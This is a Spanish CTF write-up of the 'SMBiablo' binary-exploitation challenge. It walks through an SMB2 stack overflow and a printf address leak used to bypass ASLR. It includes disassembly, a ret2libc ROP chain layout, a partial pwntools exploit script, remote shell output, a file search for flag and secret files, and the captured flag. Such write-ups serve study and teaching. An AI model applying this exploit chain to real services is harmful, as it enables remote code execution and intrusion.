---
tipo: laboratorio
Plataforma: Pentraze CTF
Ronda: 2
Fuente: '[[assets/PentraZE-2026-ronda-2/ctf.docx]]'
actualizado: 2026-10-18
tags: [ctf, pentraze, ronda-2, pwn, rop, ret2libc, smb2]
Categoría: PWN
Estado: Completado
Flag: PENTRAZE{689a7ccd0836e3eebc165b9339f45dafc5be402ce46d630e045550cfc74ca5e3}
Estado_flag: Documentada en la fuente
---

- **Categoría Principal:** [[CTF - Binary Exploitation|PWN]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Ronda:** [[PentraZE CTF 2026 - Ronda 2|Segunda ronda]]
- **Estado:** Completado

# Writeup - SMBiablo

> [!info] Objetivo
> Analizar el servidor SMB2, combinar una filtración de libc y un desbordamiento de pila, y recuperar la flag desde una shell remota.

## Resumen rápido de la cadena de ataque

1. El servicio esperaba SMB2 binario; `HELP` no era una interfaz válida.
2. El ELF x86-64 tenía NX, Partial RELRO, sin canary y sin PIE.
3. `DialectCount * 2` controlaba una copia sin comprobación de tamaño.
4. El comando `0xFFFF` filtraba `printf` desde la GOT y permitía calcular la base de libc.
5. Se documenta un offset de 56 bytes a RIP y una cadena `ret → pop rdi; ret → /bin/sh → system`.
6. La shell ejecutó `id` como `ctf` y permitió leer `/tmp/flag.txt`.

## Vulnerabilidades y hallazgos

- [[Stack Buffer Overflow y ret2libc]] por longitud SMB2 no acotada en `memcpy`.
- Filtración de `printf` desde GOT: reduce la protección de ASLR para la libc suministrada.
- [[9- SMB|SMB2]] como superficie de un parser personalizado; el hallazgo no se atribuye a toda implementación SMB.
- [[Reversing - de leer código fuente a desensamblar binarios|Ingeniería inversa]] con `objdump`, símbolos ELF y análisis de protecciones; automatización con pwntools.

## Contexto documentado

Reto resuelto

- **Categoría:** PWN
- **Autor del reto:** Br0nco
- **Dificultad:** No especificada
- **Técnicas:** Ingeniería inversa, Stack Buffer Overflow, Information Leak, ROP y ret2libc
- **Herramientas:** Fedora Linux, nc, file, checksec, nm, objdump, readelf, Python y pwntools.

## Paso a paso técnico

### 1. Descripción del reto

Durante una auditoría de red en Acheron Systems, el equipo de respuesta encontró un servidor que nadie recuerda haber desplegado. No tiene nombre, no tiene dueño, no tiene documentación. Los logs de switches dicen que lleva 847 días encendido. Acepta cualquier conexión. Nunca las corta. Y no aparece en ningún inventario. Alguien lo vio, lo marcó como legacy en el CMDB, y siguió con su día.

El reto proporcionaba un servicio TCP y un archivo smbiablo.zip, que contenía el ejecutable vulnerable y una biblioteca libc.so.6.

El objetivo era identificar una vulnerabilidad explotable en la implementación del protocolo SMB2, conseguir ejecución de comandos y recuperar la flag.

### 2. Reconocimiento inicial

La conexión al servicio se realizó mediante:

```bash
nc 34.135.253.132 36102
```

El servidor mostraba un banner:

```text
Acheron Systems — Internal File Services
ACHERON-FS-07 · ACHERON.INTERNAL

Protocol   SMB2 / CIFS v2.3.1
Status     OPERATIONAL
```

Inicialmente se probó HELP, pero no existía una interfaz textual de comandos. El servicio esperaba paquetes binarios con estructura SMB2.

Después se extrajeron los archivos proporcionados:

```bash
unzip ~/Escritorio/smbiablo.zip -d ~/ctf/smbiablo
cd ~/ctf/smbiablo
file smbiablo libc.so.6
```

Se identificó un ejecutable ELF de 64 bits, x86-64, dinámicamente enlazado y con símbolos disponibles, junto a una biblioteca libc específica para el reto.

### 3. Análisis de protecciones

Se utilizó:

```bash
checksec --file=./smbiablo
```

| Protección | Resultado |
| --- | --- |
| RELRO | Partial RELRO |
| Stack Canary | No |
| NX | Activado |
| PIE | Desactivado |
| Símbolos | 71 |

La ausencia de stack canary y PIE facilitaba una posible explotación mediante corrupción de la pila. Sin embargo, NX impedía depender de una ejecución directa de código inyectado en la pila.

Por ello, una técnica como ret2libc resultaba especialmente interesante.

### 4. Ingeniería inversa

El análisis de símbolos permitió identificar tres funciones importantes:

```text
0x4014d6  send_banner
0x4015e5  send_smb2
0x401702  handle_negotiate
0x4017d3  main
```

El desensamblado se realizó con:

```bash
objdump -d -M intel ./smbiablo \
  --start-address=0x401702 \
  --stop-address=0x4017d3
```

#### 4.1 Vulnerabilidad Stack Buffer Overflow

Dentro de handle_negotiate() apareció la siguiente secuencia:

```asm
401717: lea    rdi,[rsp+0x50]
40171c: movzx  edx,WORD PTR [rsi+0x2]
401720: add    edx,edx
401725: add    rsi,0x24
401729: call   memcpy@plt
```

El programa leía el campo DialectCount del paquete SMB2, lo multiplicaba por dos y utilizaba ese valor como longitud para memcpy().

El problema era que no comprobaba que los datos cupieran dentro del búfer local.

Esto permitía sobrescribir información adyacente de la pila, incluida la dirección de retorno.

El desplazamiento utilizado hasta RIP fue de 56 bytes, y el exploit empleó un contador de 48 dialectos, provocando una copia de 96 bytes.

#### 4.2 Filtración de memoria mediante 0xFFFF

También se descubrió un comando SMB2 especial:

```asm
401cd0: mov rax,QWORD PTR [rip+0x2319]
401cd7: mov QWORD PTR [rsp+0x58],rax
401cec: mov edx,0xffff
401cf3: call send_smb2
```

Este comando devolvía el puntero asociado a printf obtenido de la GOT del ejecutable.

La filtración permitía calcular la dirección base de libc y preparar una cadena ROP con direcciones válidas.

### 5. Explotación de ASLR mediante Information Leak

Se construyó un paquete SMB2 con el comando 0xFFFF y se envió al servidor.

La respuesta contenía una dirección de printf:

```text
printf:        0x722580cd06f0
printf offset: 0x606f0
libc base:     0x722580c70000
```

La dirección base se calculó mediante:

$$
\text{libc base} = \text{printf leak} - \text{printf offset}
$$

$$
0x722580cd06f0 - 0x606f0 = 0x722580c70000
$$

El resultado estaba alineado a página de memoria, lo que confirmó la coherencia del cálculo con la biblioteca proporcionada.

Es importante señalar que estas direcciones corresponden a la ejecución documentada. No deben considerarse constantes universales para cualquier nueva instancia.

### 6. Construcción de la cadena ret2libc

Con la base de libc conocida, se localizaron los siguientes elementos:

```text
ret:       0x722580c99cd6
pop rdi:   0x722580c9a3e5
/bin/sh:   0x722580e48678
system:    0x722580cc0d70
```

El exploit construyó una cadena ROP con esta disposición:

#### Distribución del payload

```text
Padding
56 bytes · A
ret
Alineación de pila
pop rdi; ret
Preparar argumento
Dirección de /bin/sh
Argumento de system()
system()
Ejecutar shell
```

La instrucción pop rdi; ret permitía cargar en RDI la dirección de la cadena /bin/sh, utilizada como primer argumento de system() en la convención de llamadas x86-64.

El gadget ret adicional se utilizó para ajustar la alineación de la pila antes de llamar a libc.

### 7. Exploit final en Python

Se desarrolló el siguiente exploit utilizando pwntools. Este automatiza la conexión, obtiene la dirección de libc, construye la cadena ROP y explota el desbordamiento.

> [!warning] Fragmento incompleto en la fuente
> El Word lo titula «Exploit final», pero el código termina después de validar la respuesta de la filtración. Se restauraron únicamente saltos de línea y sangría. Faltan la extracción del puntero, el cálculo de base/gadgets, la construcción y envío del desbordamiento y la interacción con la shell. La cadena y las salidas posteriores se conservan como evidencia documental; este fragmento no reproduce por sí solo la explotación completa.

```python
from pwn import *
import struct

HOST = "34.135.253.132"
PORT = 36102
context.arch = "amd64"
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False)

def packet(command, body=b""):
    header = bytearray(64)
    header[:4] = b"\xfeSMB"
    struct.pack_into("<H", header, 4, 64)
    struct.pack_into("<H", header, 12, command)
    payload = bytes(header) + body
    return p32(len(payload), endian="big") + payload

io = remote(HOST, PORT)
io.recvuntil(b"Status     OPERATIONAL")
io.recvrepeat(0.3)
# Filtrar direccion de printf
io.send(packet(0xffff))
size = u32(io.recvn(4), endian="big")
response = io.recvn(size)
assert len(response) == 80
assert response[:4] == b"\xfeSMB"
```

El script fue ejecutado mediante:

```bash
python exploit.py
```

### 8. Obtención de ejecución remota de comandos

La explotación fue exitosa. El servidor devolvió una respuesta SMB2 de 129 bytes y posteriormente aceptó comandos de shell.

```text
[+] Opening connection to 34.135.253.132 on port 36102: Done
[+] printf: 0x722580cd06f0
[+] libc base: 0x722580c70000
[*] Enviando SMB2 NEGOTIATE manipulado
[*] Respuesta SMB2: 129 bytes
[*] Probando shell
[*] Switching to interactive mode
SMBIABLO_PWN_OK
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/
$
```

La ejecución del comando id confirmó que se había conseguido una shell como usuario ctf, con UID 1000.

### 9. Localización y extracción de la flag

Una vez obtenida la shell, se enumeró el sistema de archivos:

```bash
ls -la /
ls -la /home/ctf
```

Posteriormente se buscaron archivos cuyos nombres contuvieran las palabras flag o secret:

```bash
find /home /app /opt /tmp -type f \
  \( -iname '*flag*' -o -iname '*secret*' \) \
  2>/dev/null
```

El servidor devolvió:

```text
/tmp/flag.txt
```

Finalmente, se leyó su contenido:

```bash
cat /tmp/flag.txt
```

Flag obtenida

```text
PENTRAZE{689a7ccd0836e3eebc165b9339f45dafc5be402ce46d630e045550cfc74ca5e3}
```

### 10. Conclusión

El reto SMBiablo, de Pentraze CTF 2026, se resolvió mediante la combinación de dos vulnerabilidades en una implementación personalizada del protocolo SMB2.

La primera permitía filtrar una dirección de memoria de libc utilizando el comando especial 0xFFFF. La segunda consistía en un desbordamiento de pila durante el procesamiento del mensaje SMB2 NEGOTIATE.

Combinando ambas vulnerabilidades fue posible superar la aleatorización de direcciones, construir una cadena ROP que invocaba system("/bin/sh") y obtener una shell remota con permisos del usuario ctf.

Finalmente, se encontró la flag en /tmp/flag.txt.

Resultado final: explotación exitosa, ejecución remota de comandos confirmada y flag recuperada.

Este reto demuestra cómo una validación insuficiente de longitudes, combinada con una filtración de direcciones, puede convertir un servicio de red aparentemente funcional en un objetivo vulnerable a ejecución remota de código.

Write-up elaborado a partir del desensamblado, las pruebas y las salidas de terminal proporcionadas durante la resolución del reto.


## Flag

```text
PENTRAZE{689a7ccd0836e3eebc165b9339f45dafc5be402ce46d630e045550cfc74ca5e3}
```

## Lecciones aprendidas y mitigar

- Validar la longitud declarada contra los bytes disponibles y la capacidad del destino antes de copiar; rechazar conteos inconsistentes.
- Retirar comandos de diagnóstico que exponen punteros, aplicar canarios, PIE y RELRO completo como defensa en profundidad.
- NX impide ejecutar código inyectado en pila, pero no evita reutilizar funciones de libc. ASLR pierde eficacia cuando una filtración revela la base necesaria.
- Los gadgets y direcciones del registro corresponden a una ejecución y a una libc concretas.
- Estas mitigaciones se derivan del análisis documentado; no se probó una versión corregida del servicio.

## Evidencia y revisión documental

El extracto Python está truncado en la fuente. Los archivos `smbiablo.zip`, `smbiablo` y `libc.so.6` no forman parte del Word, por lo que no se han revalidado offsets contra los binarios. La fuente dice «tres funciones» y enumera cuatro símbolos incluyendo `main`; se conserva la lista completa.

Fuente conservada: [[assets/PentraZE-2026-ronda-2/ctf.docx|ctf.docx original]]. Las descripciones, pruebas, payloads y salidas anteriores proceden de ese documento; no se han reejecutado. Las relaciones y mitigaciones adicionales son síntesis editorial. El Word no contiene imágenes incrustadas.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🏠 MOC: [[PentraZE CTF 2026 - MOC]]
- 🗂️ Ronda: [[PentraZE CTF 2026 - Ronda 2]]
- 🗂️ Categoría: [[CTF - Binary Exploitation]]
- ⬅️ Anterior: [[Writeup - Nozama Store]]
- ➡️ Siguiente: [[Writeup - Data Del Más Allá]]

## Relacionadas

- [[GDB baby step 1]] — progresión desde localizar un valor en ensamblador hasta interpretar punteros, argumentos y control de flujo.
- [[Writeup - Data Del Más Allá]] — ambos parten de binarios y protocolos; SMBiablo sí demuestra corrupción de pila y Data recupera la autorización sin explotación de heap confirmada.
- [[Triaje de archivos - file, strings y exiftool]] — identificar ELF y biblioteca antes de elegir herramientas.
- [[MOC - Python para Ciberseguridad]] — serialización binaria con `struct` y pwntools frente al JSON de los retos web.
- [[Networking]] — distinguir la conexión TCP del protocolo de aplicación que debe hablarse sobre ella.
